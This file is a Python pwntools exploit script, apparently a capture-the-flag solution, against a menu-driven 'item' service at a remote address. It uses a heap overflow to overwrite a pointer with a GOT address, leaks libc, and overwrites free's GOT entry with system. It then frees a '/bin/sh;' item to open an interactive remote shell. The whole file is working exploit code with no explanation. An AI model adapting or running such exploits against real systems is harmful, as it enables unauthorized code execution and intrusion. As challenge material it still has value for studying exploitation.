from pwn import *

def AddItem(content):
	r.sendlineafter("> ", "1")
	r.sendlineafter("content: ", content)

def ShowItem():
	r.sendlineafter("> ", "2")

def DeleteItem(index):
	r.sendlineafter("> ", "3")
	r.sendlineafter("deleted: ", str(index))

def ModifyItem(index, content):
	r.sendlineafter("> ", "4")
	r.sendlineafter("modify: ", str(index))
	r.sendlineafter("content: ", content)

r = remote("112.166.114.143", 317)
# r = process("./item")

free_got = 0x0000000000602018
read_got = 0x0000000000602048

AddItem('5unKn0wn')
AddItem('5unKn0wn')
DeleteItem(0)
AddItem('A' * 0x78 + p64(read_got)[:-2])
ShowItem()

r.recvuntil('[1094795585] - ')
libc_base = u64(r.recv(6) + "\x00\x00") - 0x00000000000F69A0
system = libc_base + 0x45380
log.info("libc_base : " + hex(libc_base))

AddItem('5unKn0wn')
AddItem('5unKn0wn')
DeleteItem(2)
AddItem('A' * 0x78 + p64(free_got)[:-2])
ModifyItem(3, p64(system))

AddItem('/bin/sh;')
DeleteItem(4)

r.interactive()
